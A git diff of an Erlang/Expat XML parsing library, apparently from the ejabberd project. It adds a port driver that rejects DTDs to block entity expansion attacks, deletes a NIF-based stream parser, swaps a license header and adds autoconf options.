+  ei_x_encode_list_header(&xmlns_buf, 1);
+  ei_x_encode_tuple_header(&xmlns_buf, 2);
+  if (prefix) {
+    prefix_len = strlen(prefix);
+    buf = driver_alloc(7 + prefix_len);
+    strcpy(buf, "xmlns:");
+    strcpy(buf+6, prefix);
+    ei_x_encode_binary(&xmlns_buf, buf, strlen(buf));
+    driver_free(buf);
+  } else {
+     ei_x_encode_binary(&xmlns_buf, "xmlns", strlen("xmlns"));
+  };
+  ei_x_encode_binary(&xmlns_buf, uri, strlen(uri));
+
+  return NULL;
+}
+
+/*
+ * Prevent entity expansion attacks (CVE-2013-1664) by refusing
+ * to process any XML that contains a DTD.
+ */
+void *erlXML_StartDoctypeDeclHandler(expat_data *d,
+                                    const XML_Char *doctypeName,
+                                    const XML_Char *doctypeSysid,
+                                    const XML_Char *doctypePubid,
+                                    int hasInternalSubset)
+{
+   XML_StopParser(d->parser, PARSING_NOT_RESUMABLE);
+   return NULL;
+}
+
+/*
+ * Prevent entity expansion attacks (CVE-2013-1664) by having an explicit
+ * default handler. According to the documentation,
+ *
+ * "Setting the handler with this call has the side effect of turning off
+ *  expansion of references to internally defined general entities. Instead
+ *  these references are passed to the default handler."
+ */
+void *erlXML_DefaultHandler(expat_data *d,
+							const XML_Char *s,
+							int len)
+{
+   return NULL;
+}
+
+static ErlDrvData expat_erl_start(ErlDrvPort port, char *buff)
+{
+   expat_data* d = (expat_data*)driver_alloc(sizeof(expat_data));
+   d->port = port;
+   d->parser = XML_ParserCreate_MM("UTF-8", &ms, "\n");
+   XML_SetUserData(d->parser, d);
+
+   set_port_control_flags(port, PORT_CONTROL_FLAG_BINARY);
+
+   XML_SetStartElementHandler(
+      d->parser, (XML_StartElementHandler)erlXML_StartElementHandler);
+   XML_SetEndElementHandler(
+      d->parser, (XML_EndElementHandler)erlXML_EndElementHandler);
+   XML_SetCharacterDataHandler(
+      d->parser, (XML_CharacterDataHandler)erlXML_CharacterDataHandler);
+
+   XML_SetStartNamespaceDeclHandler(
+      d->parser, (XML_StartNamespaceDeclHandler) erlXML_StartNamespaceDeclHandler);
+   XML_SetStartDoctypeDeclHandler(
+      d->parser, (XML_StartDoctypeDeclHandler) erlXML_StartDoctypeDeclHandler);
+   XML_SetReturnNSTriplet(d->parser, 1);
+
+   XML_SetDefaultHandler(
+      d->parser, (XML_DefaultHandler) erlXML_DefaultHandler);
+
+   return (ErlDrvData)d;
+}
+
+static void expat_erl_stop(ErlDrvData handle)
+{
+   XML_ParserFree(((expat_data *)handle)->parser);
+   driver_free((char*)handle);
+}
+
+static ErlDrvSSizeT expat_erl_control(ErlDrvData drv_data,
+			     unsigned int command,
+			     char *buf, ErlDrvSizeT len,
+			     char **rbuf, ErlDrvSizeT rlen)
+{
+   expat_data* d = (expat_data*)drv_data;
+   int res, errcode;
+   char *errstring;
+   ErlDrvBinary *b;
+   size_t size;
+
+   switch (command)
+   {
+      case PARSE_COMMAND:
+      case PARSE_FINAL_COMMAND:
+	 ei_x_new_with_version(&event_buf);
+	 ei_x_new(&xmlns_buf);
+#ifdef ENABLE_FLASH_HACK
+        /* Flash hack - Flash clients send a null byte after the stanza.  Remove that... */
+        {
+           int i;
+           int found_null = 0;
+
+           /* Maybe the Flash client sent many stanzas in one packet.
+              If so, there is a null byte between every stanza. */
+           for (i = 0; i < len; i++) {
+              if (buf[i] == '\0') {
+                 buf[i] = ' ';
+                 found_null = 1;
+              }
+           }
+
+           /* And also remove the closing slash if this is a
+              flash:stream element.  Assume that flash:stream is the
+              last element in the packet, and entirely contained in
+              it.  This requires that a null byte has been found. */
+           if (found_null && strstr(buf, "<flash:stream"))
+              /* buf[len - 1] is an erased null byte.
+                 buf[len - 2] is >
+                 buf[len - 3] is / (maybe)
+              */
+              if (buf[len - 3] == '/')
+                 buf[len - 3] = ' ';
+        }
+#endif /* ENABLE_FLASH_HACK */
+
+	 res = XML_Parse(d->parser, buf, len, command == PARSE_FINAL_COMMAND);
+
+	 if(!res)
+	 {
+		 errcode = XML_GetErrorCode(d->parser);
+		 if (errcode == XML_STATUS_SUSPENDED)
+			 errstring = (char *)"DTDs are not allowed";
+		 else
+			 errstring = (char *)XML_ErrorString(errcode);
+
+	    ei_x_encode_list_header(&event_buf, 1);
+	    ei_x_encode_tuple_header(&event_buf, 2);
+	    ei_x_encode_long(&event_buf, XML_ERROR);
+	    ei_x_encode_tuple_header(&event_buf, 2);
+	    ei_x_encode_long(&event_buf, errcode);
+	    ei_x_encode_binary(&event_buf, errstring, strlen(errstring));
+	 }
+
+	 ei_x_encode_empty_list(&event_buf);
+
+	 size = event_buf.index;
+
+	 b = driver_alloc_binary(size);
+	 memcpy(b->orig_bytes, event_buf.buff, size);
+
+	 ei_x_free(&event_buf);
+	 ei_x_free(&xmlns_buf);
+ 
+	 *rbuf = (char *)b;
+	 return size;
+      default:
+	 return 0;
+   }
+}
+
+ErlDrvEntry expat_driver_entry = {
+   NULL,			/* F_PTR init, N/A */
+   expat_erl_start,		/* L_PTR start, called when port is opened */
+   expat_erl_stop,		/* F_PTR stop, called when port is closed */
+   NULL,			/* F_PTR output, called when erlang has sent */
+   NULL,			/* F_PTR ready_input, called when input descriptor ready */
+   NULL,			/* F_PTR ready_output, called when output descriptor ready */
+   "expat_erl",			/* char *driver_name, the argument to open_port */
+   NULL,			/* F_PTR finish, called when unloaded */
+   NULL,			/* handle */
+   expat_erl_control,		/* F_PTR control, port_command callback */
+   NULL,			/* F_PTR timeout, reserved */
+   NULL,			/* F_PTR outputv, reserved */
+  /* Added in Erlang/OTP R15B: */
+  NULL,                 /* ready_async */
+  NULL,                 /* flush */
+  NULL,                 /* call */
+  NULL,                 /* event */
+  ERL_DRV_EXTENDED_MARKER,        /* extended_marker */
+  ERL_DRV_EXTENDED_MAJOR_VERSION, /* major_version */
+  ERL_DRV_EXTENDED_MINOR_VERSION, /* minor_version */
+  0,                    /* driver_flags */
+  NULL,                 /* handle2 */
+  NULL,                 /* process_exit */
+  NULL                  /* stop_select */
+};
+
+DRIVER_INIT(expat_erl) /* must match name in driver_entry */
+{
+    ms.malloc_fcn = driver_alloc;
+    ms.realloc_fcn = driver_realloc;
+    ms.free_fcn = driver_free;
+    return &expat_driver_entry;
+}
+
+
diff --git a/c_src/xml.c b/c_src/xml.c
index 82e16b9..0b77822 100644
--- a/c_src/xml.c
+++ b/c_src/xml.c
@@ -1,17 +1,20 @@
 /*
- * Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+ * ejabberd, Copyright (C) 2002-2015   ProcessOne
  *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
  *
- *     http://www.apache.org/licenses/LICENSE-2.0
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+ * General Public License for more details.
  *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+ * 02111-1307 USA
  *
  */
 
@@ -284,6 +287,14 @@ static ERL_NIF_TERM element_to(ErlNifEnv* env, int argc,
   return enif_make_badarg(env);
 }
 
+#ifdef SSL40
+static ERL_NIF_TERM element_to_string(ErlNifEnv* env, int argc,
+				      const ERL_NIF_TERM argv[])
+{
+  return element_to(env, argc, argv, 1);
+}
+#endif
+
 static ERL_NIF_TERM element_to_binary(ErlNifEnv* env, int argc,
 				      const ERL_NIF_TERM argv[])
 {
@@ -292,6 +303,12 @@ static ERL_NIF_TERM element_to_binary(ErlNifEnv* env, int argc,
 
 static ErlNifFunc nif_funcs[] =
   {
+    /* Stupid Erlang bug with enif_make_string() is fixed
+       in R14A only (OTP-8685), so we can't use
+       element_to_string in Erlang < R14A.*/
+#ifdef SSL40
+    {"element_to_string", 1, element_to_string},
+#endif
     {"element_to_binary", 1, element_to_binary}
   };
 
diff --git a/c_src/xml_stream.c b/c_src/xml_stream.c
deleted file mode 100644
index 885542d..0000000
--- a/c_src/xml_stream.c
+++ /dev/null
@@ -1,626 +0,0 @@
-/*
- * Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
- *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- *     http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- *
- */
-
-#include <erl_nif.h>
-#include <string.h>
-#include <stdio.h>
-#include <expat.h>
-
-#define XML_START 0
-#define XML_END   1
-#define XML_CDATA 2
-#define PARSING_NOT_RESUMABLE XML_FALSE
-
-#define ASSERT(x) if (!(x)) return 0
-
-typedef struct attr_t {
-  char *name;
-  char *val;
-  struct attr_t *next;
-} attr_t;
-
-typedef struct event_t {
-  int type;
-  char *data;
-  attr_t *attrs;
-  struct event_t *next;
-} event_t;
-
-typedef struct {
-  ErlNifEnv *env;
-  ErlNifEnv *send_env;
-  ErlNifPid *pid;
-  attr_t *xmlns_attrs;
-  event_t *events;
-  size_t start;
-  size_t end;
-  char *root;
-  XML_Parser parser;
-  size_t size;
-  size_t max_size;
-} state_t;
-
-static XML_Memory_Handling_Suite ms = {
-  .malloc_fcn = enif_alloc,
-  .realloc_fcn = enif_realloc,
-  .free_fcn = enif_free
-};
-
-static ErlNifResourceType *parser_state_t = NULL;
-
-static attr_t *alloc_attr(attr_t *next_attr)
-{
-  attr_t *attr = enif_alloc(sizeof(attr_t));
-  ASSERT(attr);
-  attr->name = NULL;
-  attr->val = NULL;
-  attr->next = next_attr;
-  return attr;
-}
-
-static void free_attr(attr_t *attr)
-{
-  if (attr) {
-    if (attr->name) enif_free(attr->name);
-    if (attr->val) enif_free(attr->val);
-    enif_free(attr);
-  }
-}
-
-static event_t *alloc_event(event_t *next_event)
-{
-  event_t *event = enif_alloc(sizeof(event_t));
-  ASSERT(event);
-  event->data = NULL;
-  event->attrs = NULL;
-  event->next = next_event;
-  return event;
-}
-
-static void free_event(event_t *event)
-{
-  if (event) {
-    if (event->data) enif_free(event->data);
-    while (event->attrs) {
-      attr_t *attr = event->attrs;
-      event->attrs = attr->next;
-      free_attr(attr);
-    }
-    enif_free(event);
-  }
-}
-
-int encode_name(const char *name, char **buf)
-{
-  char *attr_start;
-  char *prefix_start;
-
-  if ((attr_start = strchr(name, '\n'))) {
-    if ((prefix_start = strchr(attr_start+1, '\n'))) {
-      size_t attr_size = prefix_start - attr_start;
-      size_t prefix_size = strlen(prefix_start) - 1;
-      size_t buf_size = attr_size + prefix_size + 1;
-      attr_start[attr_size] = 0;
-      *buf = enif_alloc(buf_size);
-      ASSERT(*buf);
-      strcpy(*buf, prefix_start+1);
-      (*buf)[prefix_size] = ':';
-      strcpy(*buf + prefix_size + 1, attr_start+1);
-    } else {
-      *buf = enif_alloc(strlen(attr_start));
-      ASSERT(*buf);
-      strcpy(*buf, attr_start+1);
-    };
-  } else {
-    *buf = enif_alloc(strlen(name) + 1);
-    ASSERT(*buf);
-    strcpy(*buf, name);
-  }
-
-  return 1;
-}
-
-static ERL_NIF_TERM str2bin(ErlNifEnv *env, char *s)
-{
-  ErlNifBinary bin;
-  if (enif_alloc_binary(strlen(s), &bin)) {
-    memcpy(bin.data, s, bin.size);
-    return enif_make_binary(env, &bin);
-  } else {
-    return enif_make_tuple2(env,
-			    enif_make_atom(env, "error"),
-			    enif_make_atom(env, "enomem"));
-  }
-}
-
-static ERL_NIF_TERM attrs2list(ErlNifEnv *env, attr_t *attr)
-{
-  ERL_NIF_TERM el;
-  ERL_NIF_TERM list = enif_make_list(env, 0);
-
-  while (attr) {
-    el = enif_make_tuple2(env, str2bin(env, attr->name), str2bin(env, attr->val));
-    list = enif_make_list_cell(env, el, list);
-    attr = attr->next;
-  }
-
-  return list;
-}
-
-static ERL_NIF_TERM process_events(ErlNifEnv *env, event_t **events, int is_root)
-{
-  event_t *event;
-  ERL_NIF_TERM name, el, children, tail;
-  ERL_NIF_TERM els = enif_make_list(env, 0);
-
-  while (*events) {
-    event = *events;
-    switch (event->type) {
-    case XML_END:
-      *events = event->next;
-      free_event(event);
-      children = process_events(env, events, 0);
-      event = *events;
-      if (event) {
-	name = str2bin(env, event->data);
-	el = enif_make_tuple4(env, enif_make_atom(env, "xmlel"),
-			      name, attrs2list(env, event->attrs), children);
-	els = enif_make_list_cell(env, el, els);
-      }
-      break;
-    case XML_CDATA:
-      el = enif_make_tuple2(env, enif_make_atom(env, "xmlcdata"),
-			    str2bin(env, event->data));
-      els = enif_make_list_cell(env, el, els);
-      break;
-    case XML_START:
-      return els;
-    }
-    if (event) {
-      *events = event->next;
-      free_event(event);
-    }
-  }
-
-  if (is_root) {
-    if (enif_get_list_cell(env, els, &el, &tail))
-      return el;
-    else
-      return enif_make_tuple2(env, enif_make_atom(env, "error"),
-			      str2bin(env, "unexpected XML error"));
-  } else
-    return els;
-}
-
-static void send_event(state_t *state, ERL_NIF_TERM el)
-{
-  state->size = 0;
-  enif_send(state->env, state->pid, state->send_env,
-	    enif_make_tuple2(state->send_env,
-			     enif_make_atom(state->send_env, "$gen_event"),
-			     enif_make_copy(state->send_env, el)));
-  enif_clear_env(state->send_env);
-}
-
-static void send_all_state_event(state_t *state, ERL_NIF_TERM el)
-{
-  state->size = 0;
-  enif_send(state->env, state->pid, state->send_env,
-	    enif_make_tuple2(state->send_env,
-			     enif_make_atom(state->send_env, "$gen_all_state_event"),
-			     enif_make_copy(state->send_env, el)));
-  enif_clear_env(state->send_env);
-}
-
-void *erlXML_StartElementHandler(state_t *state,
-				 const XML_Char *name,
-				 const XML_Char **atts)
-{
-  size_t i = 0;
-  attr_t *attr = state->xmlns_attrs;
-  state->xmlns_attrs = NULL;
-
-  while (atts[i]) {
-    attr = alloc_attr(attr);
-    ASSERT(attr);
-    ASSERT(encode_name(atts[i], &attr->name));
-    attr->val = enif_alloc(strlen(atts[i+1]) + 1);
-    ASSERT(attr->val);
-    strcpy(attr->val, atts[i+1]);
-    i += 2;
-  }
-
-  event_t *event = alloc_event(state->events);
-  ASSERT(event);
-  event->type = XML_START;
-  event->attrs = attr;
-  ASSERT(encode_name(name, &event->data));
-
-  if (state->pid && !state->root) {
-    state->root = event->data;
-    send_event(state,
-	       enif_make_tuple3(state->env,
-				enif_make_atom(state->env, "xmlstreamstart"),
-				str2bin(state->env, event->data),
-				attrs2list(state->env, event->attrs)));
-    event->data = NULL;
-    free_event(event);
-  } else {
-    state->events = event;
-    state->start++;
-  }
-
-  return NULL;
-}
-
-void *erlXML_CharacterDataHandler(state_t *state, const XML_Char *s, int len)
-{
-  if (state->pid && !state->start) {
-    char *cdata = enif_alloc(len + 1);
-    ASSERT(cdata);
-    memcpy(cdata, s, len);
-    cdata[len] = 0;
-    send_all_state_event(state,
-			 enif_make_tuple2(state->env,
-					  enif_make_atom(state->env, "xmlstreamcdata"),
-					  str2bin(state->env, cdata)));
-    enif_free(cdata);
-    return NULL;
-  }
-
-  if (state->events) {
-    event_t *event = state->events;
-    if (event->type == XML_CDATA) {
-      size_t size = strlen(event->data);
-      event->data = enif_realloc(event->data, size + len + 1);
-      ASSERT(event->data);
-      memcpy(event->data + size, s, len);
-      event->data[size + len] = 0;
-      return NULL;
-    }
-  }
-
-  event_t *event = alloc_event(state->events);
-  ASSERT(event);
-  event->type = XML_CDATA;
-  event->data = enif_alloc(len + 1);
-  ASSERT(event->data);
-  memcpy(event->data, s, len);
-  event->data[len] = 0;
-
-  state->events = event;
-
-  return NULL;
-}
-
-void *erlXML_EndElementHandler(state_t *state, const XML_Char *name)
-{
-  event_t *event = alloc_event(state->events);
-  ASSERT(event);
-  event->type = XML_END;
-
-  if (state->pid && !state->start) {
-    send_event(state,
-	       enif_make_tuple2(state->env,
-				enif_make_atom(state->env, "xmlstreamend"),
-				str2bin(state->env, state->root)));
-    free_event(event);
-    return NULL;
-  }
-
-  state->events = event;
-  state->end++;
-
-  if (state->pid && state->start == state->end) {
-    state->start = 0;
-    state->end = 0;
-    ERL_NIF_TERM el = process_events(state->env, &state->events, 1);
-    send_event(state,
-	       enif_make_tuple2(state->env,
-				enif_make_atom(state->env, "xmlstreamelement"),
-				el));
-  }
-
-  return NULL;
-}
-
-void *erlXML_StartNamespaceDeclHandler(state_t *state,
-				       const XML_Char *prefix,
-				       const XML_Char *uri)
-{
-  /* From the expat documentation:
-     "For a default namespace declaration (xmlns='...'),
-     the prefix will be null ...
-     ... The URI will be null for the case where
-     the default namespace is being unset."
-
-     FIXME: I'm not quite sure what all that means */
-  if (uri == NULL)
-      return NULL;
-
-  attr_t *attr = alloc_attr(state->xmlns_attrs);
-  ASSERT(attr);
-
-  if (prefix) {
-    attr->name = enif_alloc(strlen(prefix) + 7);
-    ASSERT(attr->name);
-    memcpy(attr->name, "xmlns:", 6);
-    strcpy(attr->name + 6, prefix);
-  } else {
-    attr->name = enif_alloc(6);
-    ASSERT(attr->name);
-    strcpy(attr->name, "xmlns");
-  };
-
-  attr->val = enif_alloc(strlen(uri) + 1);
-  ASSERT(attr->val);
-  strcpy(attr->val, uri);
-
-  state->xmlns_attrs = attr;
-
-  return NULL;
-}
-
-/*
- * Prevent entity expansion attacks (CVE-2013-1664) by refusing
- * to process any XML that contains a DTD.
- */
-void *erlXML_StartDoctypeDeclHandler(state_t *state,
-				     const XML_Char *doctypeName,
-				     const XML_Char *doctypeSysid,
-				     const XML_Char *doctypePubid,
-				     int hasInternalSubset)
-{
-  XML_StopParser(state->parser, PARSING_NOT_RESUMABLE);
-  return NULL;
-}
-
-/*
- * Prevent entity expansion attacks (CVE-2013-1664) by having an explicit
- * default handler. According to the documentation,
- *
- * "Setting the handler with this call has the side effect of turning off
- *  expansion of references to internally defined general entities. Instead
- *  these references are passed to the default handler."
- */
-void *erlXML_DefaultHandler(state_t *state, const XML_Char *s, int len)
-{
-  return NULL;
-}
-
-static void destroy_parser_state(ErlNifEnv *env, void *data)
-{
-  state_t *state = (state_t *) data;
-  if (state) {
-    if (state->parser) XML_ParserFree(state->parser);
-    if (state->pid) enif_free(state->pid);
-    if (state->send_env) enif_free_env(state->send_env);
-    if (state->root) enif_free(state->root);
-    while (state->xmlns_attrs) {
-      attr_t *attr = state->xmlns_attrs;
-      state->xmlns_attrs = attr->next;
-      free_attr(attr);
-    }
-    while (state->events) {
-      event_t *event = state->events;
-      state->events = event->next;
-      free_event(event);
-    }
-    memset(state, 0, sizeof(state_t));
-  }
-}
-
-static state_t *init_parser_state(ErlNifPid *pid)
-{
-  state_t *state = enif_alloc_resource(parser_state_t, sizeof(state_t));
-  ASSERT(state);
-  memset(state, 0, sizeof(state_t));
-  if (pid) {
-    state->send_env = enif_alloc_env();
-    state->pid = enif_alloc(sizeof(ErlNifPid));
-    ASSERT(state->send_env);
-    ASSERT(state->pid);
-    memcpy(state->pid, pid, sizeof(ErlNifPid));
-  }
-  state->parser = XML_ParserCreate_MM("UTF-8", &ms, "\n");
-  ASSERT(state->parser);
-  XML_SetUserData(state->parser, state);
-  XML_SetStartElementHandler(state->parser,
-			     (XML_StartElementHandler) erlXML_StartElementHandler);
-  XML_SetEndElementHandler(state->parser,
-			   (XML_EndElementHandler) erlXML_EndElementHandler);
-  XML_SetCharacterDataHandler(state->parser,
-			      (XML_CharacterDataHandler) erlXML_CharacterDataHandler);
-  XML_SetStartNamespaceDeclHandler(state->parser,
-				   (XML_StartNamespaceDeclHandler)
-				   erlXML_StartNamespaceDeclHandler);
-  XML_SetStartDoctypeDeclHandler(state->parser,
-				 (XML_StartDoctypeDeclHandler)
-				 erlXML_StartDoctypeDeclHandler);
-  XML_SetReturnNSTriplet(state->parser, 1);
-  XML_SetDefaultHandler(state->parser, (XML_DefaultHandler) erlXML_DefaultHandler);
-  return state;
-}
-
-static int load(ErlNifEnv* env, void** priv, ERL_NIF_TERM load_info)
-{
-  ErlNifResourceFlags flags = ERL_NIF_RT_CREATE | ERL_NIF_RT_TAKEOVER;
-  parser_state_t = enif_open_resource_type(env, NULL, "parser_state_t",
-					   destroy_parser_state,
-					   flags, NULL);
-  return 0;
-}
-
-static ERL_NIF_TERM make_parse_error(ErlNifEnv *env, XML_Parser parser)
-{
-  int errcode = XML_GetErrorCode(parser);
-  char *errstring;
-
-  if (errcode == XML_STATUS_SUSPENDED)
-    errstring = "DTDs are not allowed";
-  else
-    errstring = (char *)XML_ErrorString(errcode);
-
-  return enif_make_tuple2(env, enif_make_uint(env, errcode),
-			  str2bin(env, errstring));
-}
-
-static ERL_NIF_TERM parse_element_nif(ErlNifEnv* env, int argc,
-				      const ERL_NIF_TERM argv[])
-{
-  ERL_NIF_TERM el;
-  ErlNifBinary bin;
-
-  if (argc != 1)
-    return enif_make_badarg(env);
-
-  if (!enif_inspect_iolist_as_binary(env, argv[0], &bin))
-    return enif_make_badarg(env);
-
-  state_t *state = init_parser_state(NULL);
-  if (!state)
-    return enif_make_badarg(env);
-
-  int res = XML_Parse(state->parser, (char *)bin.data, bin.size, 1);
-  if (res)
-    el = process_events(env, &state->events, 1);
-  else
-    el = enif_make_tuple2(env, enif_make_atom(env, "error"),
-			  make_parse_error(env, state->parser));
-
-  enif_release_resource(state);
-  return el;
-}
-
-static ERL_NIF_TERM parse_nif(ErlNifEnv* env, int argc,
-			      const ERL_NIF_TERM argv[])
-{
-  state_t *state = NULL;
-  ErlNifBinary bin;
-
-  if (argc != 2)
-    return enif_make_badarg(env);
-
-  if (!enif_get_resource(env, argv[0], parser_state_t, (void *) &state))
-    return enif_make_badarg(env);
-
-  if (!enif_inspect_iolist_as_binary(env, argv[1], &bin))
-    return enif_make_badarg(env);
-
-  if (!state->parser || !state->pid || !state->send_env)
-    return enif_make_badarg(env);
-
-  state->size += bin.size;
-  state->env = env;
-
-  if (state->size >= state->max_size) {
-    send_event(state,
-	       enif_make_tuple2(env,
-				enif_make_atom(env, "xmlstreamerror"),
-				str2bin(env, "XML stanza is too big")));
-  } else {
-    int res = XML_Parse(state->parser, (char *)bin.data, bin.size, 0);
-    if (!res)
-      send_event(state,
-		 enif_make_tuple2(env,
-				  enif_make_atom(env, "xmlstreamerror"),
-				  make_parse_error(env, state->parser)));
-  }
-
-  return enif_make_resource(env, state);
-}
-
-static ERL_NIF_TERM change_callback_pid_nif(ErlNifEnv* env, int argc,
-					    const ERL_NIF_TERM argv[])
-{
-  state_t *state = NULL;
-  ErlNifPid pid;
-
-  if (argc != 2)
-    return enif_make_badarg(env);
-
-  if (!enif_get_resource(env, argv[0], parser_state_t, (void *) &state))
-    return enif_make_badarg(env);
-
-  if (!state->parser || !state->pid || !state->send_env)
-    return enif_make_badarg(env);
-
-  if (!enif_get_local_pid(env, argv[1], &pid))
-    return enif_make_badarg(env);
-
-  memcpy(state->pid, &pid, sizeof(ErlNifPid));
-
-  return enif_make_resource(env, state);
-}
-
-static ERL_NIF_TERM close_nif(ErlNifEnv* env, int argc,
-			      const ERL_NIF_TERM argv[])
-{
-  state_t *state = NULL;
-
-  if (argc != 1)
-    return enif_make_badarg(env);
-
-  if (!enif_get_resource(env, argv[0], parser_state_t, (void *) &state))
-    return enif_make_badarg(env);
-
-  if (!state->parser || !state->pid)
-    return enif_make_badarg(env);
-
-  destroy_parser_state(env, state);
-
-  return enif_make_atom(env, "true");
-}
-
-static ERL_NIF_TERM new_nif(ErlNifEnv* env, int argc,
-			    const ERL_NIF_TERM argv[])
-{
-  if (argc != 2)
-    return enif_make_badarg(env);
-
-  ErlNifPid pid;
-  if (!enif_get_local_pid(env, argv[0], &pid))
-    return enif_make_badarg(env);
-
-  state_t *state = init_parser_state(&pid);
-  if (!state)
-    return enif_make_badarg(env);
-
-  ERL_NIF_TERM result = enif_make_resource(env, state);
-  enif_release_resource(state);
-
-  ErlNifUInt64 max_size;
-  if (enif_get_uint64(env, argv[1], &max_size))
-    state->max_size = (size_t) max_size;
-  else if (!enif_compare(argv[1], enif_make_atom(env, "infinity")))
-    state->max_size = (size_t) - 1;
-  else
-    return enif_make_badarg(env);
-
-  return result;
-}
-
-static ErlNifFunc nif_funcs[] =
-  {
-    {"new", 2, new_nif},
-    {"parse", 2, parse_nif},
-    {"parse_element", 1, parse_element_nif},
-    {"close", 1, close_nif},
-    {"change_callback_pid", 2, change_callback_pid_nif}
-  };
-
-ERL_NIF_INIT(xml_stream, nif_funcs, load, NULL, NULL, NULL)
diff --git a/configure b/configure
index 184a7e5..7a01824 100755
--- a/configure
+++ b/configure
@@ -619,6 +619,9 @@ ac_includes_default="\
 #endif"
 
 ac_subst_vars='LTLIBOBJS
+flash_hack
+disable_nif
+full_xml
 ERLCFLAGS
 ERLC
 ERL
@@ -675,6 +678,9 @@ SHELL'
 ac_subst_files=''
 ac_user_opts='
 enable_option_checking
+enable_full_xml
+enable_disable_nif
+enable_flash_hack
 '
       ac_precious_vars='build_alias
 host_alias
@@ -1293,6 +1299,15 @@ if test -n "$ac_init_help"; then
    esac
   cat <<\_ACEOF
 
+Optional Features:
+  --disable-option-checking  ignore unrecognized --enable/--with options
+  --disable-FEATURE       do not include FEATURE (same as --enable-FEATURE=no)
+  --enable-FEATURE[=ARG]  include FEATURE [ARG=yes]
+  --enable-full-xml       use XML features in XMPP stream (ex: CDATA)
+                          (default: no, requires XML compliant clients)
+  --disable-nif           (default: no)
+  --enable-flash-hack     support Adobe Flash client XML (default: no)
+
 Some influential environment variables:
   CC          C compiler command
   CFLAGS      C compiler flags
@@ -3787,6 +3802,48 @@ if test "x$EXPAT_HEADER" = "x"; then
    as_fn_error $? "Expat header file \"expat.h\" was not found" "$LINENO" 5
 fi
 
+# Check whether --enable-full_xml was given.
+if test "${enable_full_xml+set}" = set; then :
+  enableval=$enable_full_xml; case "${enableval}" in
+  yes) full_xml=true ;;
+  no)  full_xml=false ;;
+  *) as_fn_error $? "bad value ${enableval} for --enable-full-xml" "$LINENO" 5 ;;
+esac
+else
+  full_xml=false
+fi
+
+
+
+# Check whether --enable-disable_nif was given.
+if test "${enable_disable_nif+set}" = set; then :
+  enableval=$enable_disable_nif; case "${enableval}" in
+  yes) disable_nif=true ;;
+  no)  disable_nif=false ;;
+  *) as_fn_error $? "bad value ${enableval} for --disable-nif" "$LINENO" 5 ;;
+esac
+else
+  disable_nif=false
+fi
+
+
+
+# Check whether --enable-flash_hack was given.
+if test "${enable_flash_hack+set}" = set; then :
+  enableval=$enable_flash_hack; case "${enableval}" in
+  yes) flash_hack=true ;;
+  no)  flash_hack=false ;;
+  *) as_fn_error $? "bad value ${enableval} for --enable-flash-hack" "$LINENO" 5 ;;
+esac
+else
+  flash_hack=false
+fi
+
+
+
+ac_config_files="$ac_config_files rebar.config.script"
+
+
 cat >confcache <<\_ACEOF
 # This file is a shell script that caches the results of configure
 # tests run on this system so they can be shared between configure
@@ -4343,11 +4400,15 @@ on `(hostname || uname -n) 2>/dev/null | sed 1q`
 
 _ACEOF
 
+case $ac_config_files in *"
+"*) set x $ac_config_files; shift; ac_config_files=$*;;
+esac
 
 
 
 cat >>$CONFIG_STATUS <<_ACEOF || ac_write_fail=1
 # Files that config.status was made for.
+config_files="$ac_config_files"
 
 _ACEOF
 
@@ -4366,6 +4427,11 @@ Usage: $0 [OPTION]... [TAG]...
                    do not print progress messages
   -d, --debug      don't remove temporary files
       --recheck    update $as_me by reconfiguring in the same conditions
+      --file=FILE[:TEMPLATE]
+                   instantiate the configuration file FILE
+
+Configuration files:
+$config_files
 
 Report bugs to the package provider."
 
@@ -4419,6 +4485,14 @@ do
     $as_echo "$ac_cs_config"; exit ;;
   --debug | --debu | --deb | --de | --d | -d )
     debug=: ;;
+  --file | --fil | --fi | --f )
+    $ac_shift
+    case $ac_optarg in
+    *\'*) ac_optarg=`$as_echo "$ac_optarg" | sed "s/'/'\\\\\\\\''/g"` ;;
+    '') as_fn_error $? "missing file argument" ;;
+    esac
+    as_fn_append CONFIG_FILES " '$ac_optarg'"
+    ac_need_defaults=false;;
   --he | --h |  --help | --hel | -h )
     $as_echo "$ac_cs_usage"; exit ;;
   -q | -quiet | --quiet | --quie | --qui | --qu | --q \
@@ -4475,12 +4549,423 @@ cat >>$CONFIG_STATUS <<\_ACEOF || ac_write_fail=1
 for ac_config_target in $ac_config_targets
 do
   case $ac_config_target in
+    "rebar.config.script") CONFIG_FILES="$CONFIG_FILES rebar.config.script" ;;
 
   *) as_fn_error $? "invalid argument: \`$ac_config_target'" "$LINENO" 5;;
   esac
 done
 
 
+# If the user did not use the arguments to specify the items to instantiate,
+# then the envvar interface is used.  Set only those that are not.
+# We use the long form for the default assignment because of an extremely
+# bizarre bug on SunOS 4.1.3.
+if $ac_need_defaults; then
+  test "${CONFIG_FILES+set}" = set || CONFIG_FILES=$config_files
+fi
+
+# Have a temporary directory for convenience.  Make it in the build tree
+# simply because there is no reason against having it here, and in addition,
+# creating and moving files from /tmp can sometimes cause problems.
+# Hook for its removal unless debugging.
+# Note that there is a small window in which the directory will not be cleaned:
+# after its creation but before its name has been assigned to `$tmp'.
+$debug ||
+{
+  tmp= ac_tmp=
+  trap 'exit_status=$?
+  : "${ac_tmp:=$tmp}"
